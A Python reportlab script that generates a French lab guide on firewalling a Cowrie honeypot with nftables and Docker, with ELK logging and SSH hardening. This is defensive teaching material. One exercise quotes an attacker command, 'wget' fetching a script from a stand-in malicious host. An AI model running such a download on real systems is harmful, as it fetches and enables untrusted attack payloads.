from reportlab.lib.pagesizes import A4
from reportlab.lib import colors
from reportlab.lib.units import cm
from reportlab.lib.styles import ParagraphStyle
from reportlab.lib.enums import TA_CENTER
from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
                                PageBreak, Preformatted, KeepTogether)
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont

FD = "/usr/share/fonts/truetype/dejavu/"
pdfmetrics.registerFont(TTFont("DV", FD + "DejaVuSans.ttf"))
pdfmetrics.registerFont(TTFont("DV-B", FD + "DejaVuSans-Bold.ttf"))
pdfmetrics.registerFont(TTFont("DV-I", FD + "DejaVuSans-Oblique.ttf"))
pdfmetrics.registerFont(TTFont("DVM", FD + "DejaVuSansMono.ttf"))
pdfmetrics.registerFont(TTFont("DVM-B", FD + "DejaVuSansMono-Bold.ttf"))
pdfmetrics.registerFontFamily("DV", normal="DV", bold="DV-B", italic="DV-I", boldItalic="DV-B")

NAVY = colors.HexColor("#1f3a5f")
ACC = colors.HexColor("#c0392b")
GREY = colors.HexColor("#f2f4f7")
CODEBG = colors.HexColor("#f6f8fa")
BOXBG = colors.HexColor("#fff8e6")
BOXBD = colors.HexColor("#e0a800")

S = {
    "title": ParagraphStyle("t", fontName="DV-B", fontSize=24, leading=30, textColor=NAVY, alignment=TA_CENTER, spaceAfter=6),
    "sub": ParagraphStyle("s", fontName="DV", fontSize=12, leading=16, textColor=colors.HexColor("#555"), alignment=TA_CENTER),
    "h1": ParagraphStyle("h1", fontName="DV-B", fontSize=16, leading=20, textColor=NAVY, spaceBefore=16, spaceAfter=8),
    "h2": ParagraphStyle("h2", fontName="DV-B", fontSize=12.5, leading=16, textColor=NAVY, spaceBefore=10, spaceAfter=4),
    "p": ParagraphStyle("p", fontName="DV", fontSize=9.8, leading=14, spaceAfter=5),
    "li": ParagraphStyle("li", fontName="DV", fontSize=9.8, leading=14, leftIndent=14, bulletIndent=3, spaceAfter=2),
    "exo": ParagraphStyle("exo", fontName="DV-B", fontSize=10.2, leading=14, textColor=ACC, spaceBefore=7, spaceAfter=3),
    "code": ParagraphStyle("code", fontName="DVM", fontSize=8.3, leading=10.8, backColor=CODEBG, borderPadding=(5, 6, 5, 6),
                           leftIndent=4, rightIndent=4, spaceBefore=3, spaceAfter=8),
    "cell": ParagraphStyle("cell", fontName="DV", fontSize=8.6, leading=11),
    "cellb": ParagraphStyle("cellb", fontName="DV-B", fontSize=8.6, leading=11, textColor=colors.white),
    "box": ParagraphStyle("box", fontName="DV", fontSize=9.5, leading=13.5, backColor=BOXBG, borderColor=BOXBD,
                          borderWidth=0.8, borderPadding=(6, 8, 6, 8), leftIndent=6, rightIndent=6, spaceBefore=6, spaceAfter=10),
}

story = []
def P(t, s="p"): story.append(Paragraph(t, S[s]))
def H1(t): story.append(Paragraph(t, S["h1"]))
def H2(t): story.append(Paragraph(t, S["h2"]))
def EXO(t): story.append(Paragraph(t, S["exo"]))
def BOX(t): story.append(Paragraph(t, S["box"]))
def LI(items):
    for i in items:
        story.append(Paragraph(i, S["li"], bulletText="•"))
def NUM(items):
    for n, i in enumerate(items, 1):
        story.append(Paragraph(i, S["li"], bulletText=f"{n}."))
def CODE(t): story.append(Preformatted(t.strip("\n"), S["code"]))
def TABLE(head, rows, widths, keep=False):
    data = [[Paragraph(h, S["cellb"]) for h in head]] + [[Paragraph(c, S["cell"]) for c in r] for r in rows]
    t = Table(data, colWidths=widths, repeatRows=1)
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), NAVY),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, GREY]),
        ("GRID", (0, 0), (-1, -1), 0.4, colors.HexColor("#c9ced6")),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("LEFTPADDING", (0, 0), (-1, -1), 5), ("RIGHTPADDING", (0, 0), (-1, -1), 5),
        ("TOPPADDING", (0, 0), (-1, -1), 4), ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
    ]))
    if keep:
        story.append(KeepTogether([_h, t]) if "_h" in globals() else KeepTogether(t))
    else:
        story.append(t)
    story.append(Spacer(1, 8))

W = A4[0] - 4 * cm

# ---------- Page de garde ----------
story.append(Spacer(1, 5 * cm))
P("TP — Pare-feu d'un honeypot Cowrie", "title")
P("Ubuntu 24.04 · nftables · Docker · envoi des logs vers ELK", "sub")
story.append(Spacer(1, 1 * cm))
P("Travaux pratiques guidés : tu réalises toutes les manipulations toi-même. "
  "Chaque exercice donne un objectif, des indices et une méthode de vérification.", "sub")
story.append(Spacer(1, 2 * cm))
TABLE(["Élément", "Valeur"], [
    ["Machine", "k8sking.master.com — 192.168.1.63/24 (Wi-Fi wlp3s0)"],
    ["Accès admin", "SSH port 2727, clés uniquement, depuis 192.168.1.33"],
    ["État initial", "ruleset nft vide, ufw inactif, seul sshd:2727 en écoute"],
    ["Objectif", "N'autoriser en sortie vers le LAN que l'envoi des logs à la VM ELK"],
], [4 * cm, W - 4 * cm])
story.append(Spacer(1, 1 * cm))
BOX("<b>Livrables attendus :</b> (1) tableau du cahier des charges rempli + réponses aux exos 1.2 et 2.1 ; "
    "(2) <font face='DVM'>/etc/nftables.conf</font> final + sorties nmap depuis le PC admin et depuis une autre VM ; "
    "(3) règles DOCKER-USER + chemin du paquet expliqué ; (4) score lynis avant/après.")
story.append(PageBreak())

# ---------- 0 ----------
H1("0. Le paysage des outils")
P("Sur Ubuntu 24.04, <b>il n'y a qu'un seul moteur de filtrage dans le noyau : nf_tables</b>. "
  "Les outils que tu vois installés sont des interfaces vers ce même moteur :")
TABLE(["Outil", "C'est quoi", "À utiliser ?"], [
    ["nft", "L'outil natif de nftables.", "<b>Oui</b> — c'est ce qu'on apprend ici."],
    ["iptables", "Couche de compatibilité : traduit la syntaxe iptables vers nftables "
                 "(<font face='DVM'>iptables v1.8.10 (nf_tables)</font>).", "Seulement parce que <b>Docker</b> l'utilise."],
    ["iptables-legacy", "L'ancien moteur x_tables. Deux moteurs en parallèle = règles invisibles l'un pour l'autre.", "<b>Non</b> — piège classique."],
    ["ufw", "Sur-couche « simple » qui génère des règles iptables.", "Non ici : conflits avec Docker, et ça cache la mécanique."],
], [3 * cm, 8.5 * cm, W - 11.5 * cm])
EXO("Exo 0.1 — Un seul moteur")
P("Prouve-toi que <font face='DVM'>iptables</font> et <font face='DVM'>nft</font> parlent de la même chose :")
CODE("""
sudo iptables -L -n
sudo nft list ruleset
sudo iptables-legacy -L -n
""")
P("Les deux premiers sont vides ? Normal. Que dit le troisième ? Explique en une phrase pourquoi il serait dangereux "
  "d'y avoir des règles.")

# ---------- 1 ----------
H1("1. Cahier des charges (avant toute règle)")
P("Un pare-feu s'écrit sur papier d'abord. Remplis les deux tableaux : c'est la vraie première étape.")
H2("Entrant — chaîne INPUT (ce qui arrive à la machine elle-même)")
TABLE(["Qui", "Port / proto", "Pourquoi", "Décision"], [
    ["192.168.1.33 (ton PC)", "tcp/2727", "SSH admin", "ACCEPT"],
    ["Internet (via la box)", "tcp/22, tcp/23 ?", "Cowrie (attaquants)", "ACCEPT — géré par Docker (voir §4)"],
    ["Tout le reste", "*", "", "DROP"],
], [4.2 * cm, 3.2 * cm, 4.6 * cm, W - 12 * cm])
_h=Paragraph("Sortant — chaîne OUTPUT (ce que la machine initie)", S["h2"])
TABLE(["Vers", "Port / proto", "Pourquoi", "Décision"], [
    ["VM ELK 192.168.1.___", "tcp/____ (5044 Logstash ? 9200 Elasticsearch ?)", "Envoi des logs", "ACCEPT"],
    ["DNS", "udp+tcp/53", "Résolution (apt, docker pull)", "ACCEPT ? vers quel serveur ?"],
    ["Internet", "tcp/443, tcp/80", "apt, docker pull, unattended-upgrades", "ACCEPT permanent ou « mode maintenance » ?"],
    ["NTP", "udp/123", "Horloge — des logs bien horodatés sont cruciaux pour un honeypot", "ACCEPT"],
    ["Reste du LAN", "*", "<b>Rien</b> : si Cowrie est compromis, il ne doit pas pouvoir scanner tes autres VM", "DROP"],
], [4.2 * cm, 3.6 * cm, 5 * cm, W - 12.8 * cm], keep=True)
EXO("Exo 1.1 — Compléter le cahier des charges")
NUM([
    "IP de la VM ELK et port d'entrée : Filebeat → Logstash (5044) ? Cowrie → Elasticsearch (9200) directement ?",
    "Comment les attaquants atteignent Cowrie : redirection de port sur la Freebox (WAN 22 → 192.168.1.63:2222 ?) "
    "ou Cowrie écoute directement sur le 22 ?",
    "La machine doit-elle sortir sur Internet en permanence (mises à jour automatiques) ou seulement quand tu le décides ?",
])
EXO("Exo 1.2 — Question piège")
P("Un honeypot doit-il pouvoir sortir sur Internet ? Que se passe-t-il si un attaquant « dans » Cowrie lance "
  "<font face='DVM'>wget http://malware.example/x.sh</font> ? Indice : Cowrie émule le shell ; regarde la doc "
  "sur <font face='DVM'>cowrie.cfg → [output_*]</font> et le mode proxy. Réponse attendue en deux phrases.")

# ---------- 2 ----------
H1("2. Concepts nftables")
P("Un ruleset nftables est organisé en <b>table → chain → rules</b> :")
CODE("""
table inet filter {                      # inet = IPv4 + IPv6 dans la même table
    chain input {
        type filter hook input priority 0; policy drop;   # hook = où l'on se branche ; policy = défaut
        ct state established,related accept              # réponses aux connexions déjà acceptées
        iif lo accept                                     # loopback
        ...
    }
}
""")
LI([
    "<b>hook input</b> = paquets destinés à la machine. <b>hook output</b> = paquets émis par la machine. "
    "<b>hook forward</b> = paquets qui <i>traversent</i> la machine (c'est là que vit Docker !).",
    "<b>policy drop</b> : tout ce qui n'a pas matché en fin de chaîne est jeté.",
    "<b>ct state</b> (conntrack) : le pare-feu est à état. Tu autorises l'ouverture d'une connexion, et les réponses "
    "passent automatiquement grâce à <font face='DVM'>established,related</font>.",
])
EXO("Exo 2.1 — Trouver le bug qui te fait perdre la machine")
P("Sans l'appliquer, explique ligne par ligne ce ruleset et repère l'erreur :")
CODE("""
table inet filter {
    chain input {
        type filter hook input priority 0; policy drop;
        iif lo accept
        tcp dport 2727 ip saddr 192.168.1.33 accept
        ct state established,related accept
    }
    chain output {
        type filter hook output priority 0; policy drop;
        oif lo accept
        ip daddr 192.168.1.50 tcp dport 5044 accept
    }
}
""")
P("<i>Indice : pense à ta session SSH actuelle et regarde attentivement la chaîne output.</i>")

# ---------- 3 ----------
H1("3. Mise en place sans se couper la branche")
BOX("<b>Règle d'or :</b> toute modification de pare-feu à distance se fait avec un filet de sécurité "
    "et un second terminal SSH déjà ouvert.")
EXO("Exo 3.1 — Le filet de sécurité")
P("Ouvre un <b>deuxième terminal SSH</b> et laisse-le ouvert. Dans le premier, prépare ceci :")
CODE("""
sudo bash -c 'sleep 120 && nft flush ruleset' &
""")
P("Explique ce que fait cette ligne, et pourquoi il faudra la <font face='DVM'>kill</font> une fois que tu auras "
  "confirmé que tout fonctionne. Alternative plus propre à chercher : <font face='DVM'>at</font> ou "
  "<font face='DVM'>systemd-run --on-active=120</font>.")
EXO("Exo 3.2 — Écrire le ruleset")
P("Écris ton ruleset dans <font face='DVM'>/etc/nftables.conf</font> (fichier chargé au démarrage par "
  "<font face='DVM'>nftables.service</font>). Structure minimale attendue :")
CODE("""
#!/usr/sbin/nft -f
flush ruleset

define ADMIN_IP = 192.168.1.33
define ELK_IP   = 192.168.1.___
define ELK_PORT = ____

table inet filter {
    chain input  { ... }
    chain output { ... }
}
""")
P("Contraintes à respecter (les règles elles-mêmes sont ton travail) :")
NUM([
    "<font face='DVM'>policy drop</font> sur <b>input</b> et sur <b>output</b>.",
    "<font face='DVM'>lo</font> accepté dans les deux sens.",
    "<font face='DVM'>established,related</font> accepté dans les deux sens ; ajoute <font face='DVM'>ct state invalid drop</font> en premier.",
    "ICMP : autorise au moins <font face='DVM'>echo-request</font> depuis le LAN en entrée (pour pouvoir pinger la machine) "
    "et les erreurs ICMP (<font face='DVM'>destination-unreachable</font>, <font face='DVM'>time-exceeded</font>). "
    "Indice : <font face='DVM'>icmp type { ... }</font> et <font face='DVM'>icmpv6 type { ... }</font>.",
    "SSH 2727 <b>uniquement</b> depuis <font face='DVM'>$ADMIN_IP</font>.",
    "Sortie : ELK, DNS, NTP, et HTTP/HTTPS selon ta décision de l'exo 1.1.",
    "<b>Une règle log juste avant le drop implicite en sortie</b> : "
    "<font face='DVM'>log prefix \"OUT-DROP \" limit rate 5/minute</font>. C'est ce qui te dira ce que tu as oublié. "
    "Où lit-on ces logs ? (<font face='DVM'>journalctl -k</font> / <font face='DVM'>dmesg</font>)",
])
P("Vérifier la syntaxe <b>sans appliquer</b>, puis appliquer, puis relire :")
CODE("""
sudo nft -c -f /etc/nftables.conf     # -c = check only
sudo nft -f /etc/nftables.conf
sudo nft list ruleset
""")
EXO("Exo 3.3 — Tests")
P("Depuis la machine :")
TABLE(["Commande", "Résultat attendu"], [
    ["ping -c1 1.1.1.1", "Passe ou non selon ton choix (exo 1.1)"],
    ["curl -sI https://archive.ubuntu.com | head -1", "HTTP/1.1 200 OK si sortie Internet autorisée"],
    ["nc -zv 192.168.1.&lt;ELK&gt; &lt;port&gt;", "<b>Doit passer</b>"],
    ["nc -zv 192.168.1.&lt;autre VM&gt; 22", "<b>Doit échouer</b> et produire une ligne OUT-DROP dans dmesg"],
], [7.5 * cm, W - 7.5 * cm])
P("Depuis ton PC, puis depuis une <b>autre</b> VM du LAN :")
CODE("""
nmap -p 2727,22,23 192.168.1.63      # depuis l'autre VM, le 2727 doit être "filtered"
""")
P("Quand tout passe : <font face='DVM'>kill %1</font> (le filet), puis "
  "<font face='DVM'>sudo systemctl enable --now nftables</font>, et <b>reboot</b> pour prouver que ça survit.")

# ---------- 4 ----------
H1("4. Docker : le piège principal")
P("Docker <b>écrit ses propres règles iptables</b> au démarrage (chaînes DOCKER, DOCKER-USER, table NAT). Conséquences :")
LI([
    "Un <font face='DVM'>-p 2222:2222</font> sur un conteneur <b>ouvre le port à tout le monde</b> en contournant ta "
    "chaîne input : le trafic passe par <i>nat prerouting → forward</i>, pas par <i>input</i>.",
    "Le trafic <i>sortant des conteneurs</i> passe par <i>forward</i>, pas par <i>output</i> : "
    "<b>ta chaîne output ne filtre pas Cowrie</b>.",
])
EXO("Exo 4.1 — Constater le contournement")
P("Installe Docker (dépôt officiel), puis :")
CODE("""
docker run -d -p 8080:80 nginx
sudo nft list ruleset          # combien de tables maintenant ?
# depuis ton PC :
curl 192.168.1.63:8080
""")
P("Ça passe alors que ton input est en <font face='DVM'>policy drop</font>. Explique pourquoi en dessinant le chemin "
  "du paquet : prerouting (nat) → forward → conteneur.")
EXO("Exo 4.2 — La chaîne DOCKER-USER")
P("Docker a prévu un point d'accroche pour toi : la chaîne <font face='DVM'>DOCKER-USER</font> (table "
  "<font face='DVM'>ip filter</font>), évaluée <b>avant</b> les règles Docker dans forward. Écris-y, en syntaxe iptables :")
NUM([
    "Autoriser <font face='DVM'>established,related</font>.",
    "Autoriser l'entrée vers les ports Cowrie depuis n'importe où (les attaquants).",
    "Autoriser la sortie des conteneurs uniquement vers ELK (si c'est Cowrie qui envoie) ; sinon <b>rien</b> vers le LAN "
    "(<font face='DVM'>-d 192.168.1.0/24 -j DROP</font>) et logguer.",
    "Réfléchis : faut-il autoriser les conteneurs à sortir sur Internet ? (retour à l'exo 1.2)",
])
P("Indice de forme — décortique cette ligne avant de l'adapter :")
CODE("""
sudo iptables -I DOCKER-USER 1 -i docker0 -d 192.168.1.0/24 ! -d $ELK_IP -j DROP
""")
P("Comment rendre ces règles persistantes alors que Docker recrée la chaîne à chaque redémarrage ? Compare trois pistes : "
  "<font face='DVM'>iptables-persistent</font> ; un drop-in systemd <font face='DVM'>ExecStartPost</font> sur "
  "<font face='DVM'>docker.service</font> ; une chaîne nft dans forward avec une priorité plus basse.")
EXO("Exo 4.3 (bonus) — Tout faire en nft")
P("Alternative : <font face='DVM'>\"iptables\": false</font> dans <font face='DVM'>/etc/docker/daemon.json</font>, et tu "
  "fais tout le NAT toi-même en nft. Plus propre, plus dur. Liste les avantages et inconvénients en quatre lignes.")

# ---------- 5 ----------
story.append(KeepTogether([Paragraph("5. Durcissement autour du pare-feu", S["h1"]), Paragraph("Chaque point est un mini-exercice « fais-le, montre-moi la preuve ».", S["p"]), Paragraph("5.1 — SSH", S["exo"])]))
P("Dans <font face='DVM'>sshd_config</font> : <font face='DVM'>AllowUsers ubuserv@192.168.1.33</font>, "
  "<font face='DVM'>MaxAuthTries 3</font>, <font face='DVM'>X11Forwarding no</font>, "
  "<font face='DVM'>AllowTcpForwarding no</font>. Vérifie avec :")
CODE("""
sudo sshd -t && sudo sshd -T | grep -Ei 'allowusers|maxauth|x11forwarding|allowtcpforwarding'
""")
P("<i>Question :</i> tu as déjà déplacé le vrai SSH sur 2727. Explique quand même le risque si Cowrie écoute sur 2222 et le "
  "vrai SSH sur 2727 (indice : <font face='DVM'>nmap -sV</font>).")
EXO("5.2 — fail2ban")
P("Crée <font face='DVM'>/etc/fail2ban/jail.local</font> avec le jail <font face='DVM'>sshd</font> sur le port 2727 et "
  "<font face='DVM'>ignoreip = 192.168.1.33</font>. Vérifie avec <font face='DVM'>sudo fail2ban-client status sshd</font>. "
  "<i>Question :</i> fail2ban écrit ses règles où ? (<font face='DVM'>sudo nft list ruleset | grep -i f2b</font>). "
  "Compatibilité avec ta table <font face='DVM'>inet filter</font> ?")
EXO("5.3 — sysctl")
P("Crée <font face='DVM'>/etc/sysctl.d/90-hardening.conf</font> avec :")
CODE("""
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.tcp_syncookies = 1
net.ipv4.conf.all.log_martians = 1
""")
P("Pour chaque ligne, une phrase : contre quoi ça protège ? Applique avec <font face='DVM'>sudo sysctl --system</font>.")
EXO("5.4 — unattended-upgrades")
P("Vérifie qu'il n'est pas bloqué par tes règles de sortie : "
  "<font face='DVM'>sudo unattended-upgrade --dry-run --debug</font>.")
EXO("5.5 — Fichier netplan")
P("<font face='DVM'>/etc/netplan/50-cloud-init.yaml</font> appartient à ubuserv et est lisible par tous alors qu'il "
  "contient le mot de passe Wi-Fi. Corrige les droits, puis corrige <font face='DVM'>gateway4: 10.0.0.1</font> qui "
  "n'est pas dans ton sous-réseau (probablement 192.168.1.254 pour une Freebox — vérifie avec "
  "<font face='DVM'>ip route</font> depuis ton PC).")
CODE("""
sudo chown root:root /etc/netplan/50-cloud-init.yaml
sudo chmod 600 /etc/netplan/50-cloud-init.yaml
sudo netplan try          # pourquoi "try" et pas "apply" ? même logique que l'exo 3.1
""")
EXO("5.6 — lynis")
P("<font face='DVM'>sudo lynis audit system</font> au début et à la fin du TP : note le « hardening index » avant/après.")

# ---------- Annexe ----------
story.append(PageBreak())
H1("Annexe — Aide-mémoire nft")
TABLE(["Commande", "Effet"], [
    ["nft list ruleset", "Affiche toutes les règles actives"],
    ["nft -c -f fichier", "Vérifie la syntaxe sans appliquer"],
    ["nft -f fichier", "Charge le fichier (avec flush ruleset en tête pour repartir de zéro)"],
    ["nft flush ruleset", "Supprime toutes les règles (tout passe)"],
    ["nft list ruleset -a", "Affiche les handles pour supprimer une règle précise"],
    ["nft delete rule inet filter output handle N", "Supprime la règle de handle N"],
    ["nft add rule inet filter input ... counter accept", "Ajoute une règle avec compteur (utile pour déboguer)"],
    ["journalctl -k -f | grep OUT-DROP", "Suit en direct ce que tes règles rejettent"],
], [7.5 * cm, W - 7.5 * cm])
H2("Matchs courants")
TABLE(["Expression", "Signification"], [
    ["iif lo / oif lo", "Interface d'entrée / de sortie"],
    ["ip saddr 192.168.1.33", "Adresse source IPv4"],
    ["ip daddr 192.168.1.0/24", "Destination dans le sous-réseau"],
    ["tcp dport { 80, 443 }", "Port destination TCP dans un ensemble"],
    ["udp dport 53", "Port destination UDP"],
    ["ct state established,related", "Connexion déjà connue de conntrack"],
    ["ct state invalid", "Paquet incohérent (à dropper)"],
    ["icmp type echo-request", "Ping IPv4 (icmpv6 type echo-request pour IPv6)"],
    ["log prefix \"X \" limit rate 5/minute", "Journalise avec préfixe, limité pour ne pas inonder"],
], [7.5 * cm, W - 7.5 * cm])
H2("Chemin d'un paquet (à retenir)")
CODE("""
Paquet destiné à la machine   : prerouting -> INPUT  -> processus local
Paquet émis par la machine    : processus  -> OUTPUT -> postrouting
Paquet vers/depuis un conteneur (Docker, -p) :
    prerouting (nat DNAT) -> FORWARD (DOCKER-USER puis DOCKER) -> conteneur
    conteneur -> FORWARD -> postrouting (nat MASQUERADE) -> LAN / Internet
""")


def footer(canvas, doc):
    canvas.saveState()
    canvas.setFont("DV", 8)
    canvas.setFillColor(colors.HexColor("#777"))
    canvas.drawString(2 * cm, 1.2 * cm, "TP Pare-feu honeypot Cowrie — nftables / Docker")
    canvas.drawRightString(A4[0] - 2 * cm, 1.2 * cm, f"Page {doc.page}")
    canvas.setStrokeColor(colors.HexColor("#ccc"))
    canvas.line(2 * cm, 1.5 * cm, A4[0] - 2 * cm, 1.5 * cm)
    canvas.restoreState()


out = "/home/ubuserv/CyberProject/TP-parefeu-cowrie.pdf"
doc = SimpleDocTemplate(out, pagesize=A4, leftMargin=2 * cm, rightMargin=2 * cm, topMargin=2 * cm, bottomMargin=2 * cm,
                        title="TP Pare-feu honeypot Cowrie", author="Claude", subject="nftables, Docker, ELK")
doc.build(story, onFirstPage=footer, onLaterPages=footer)
print(out)
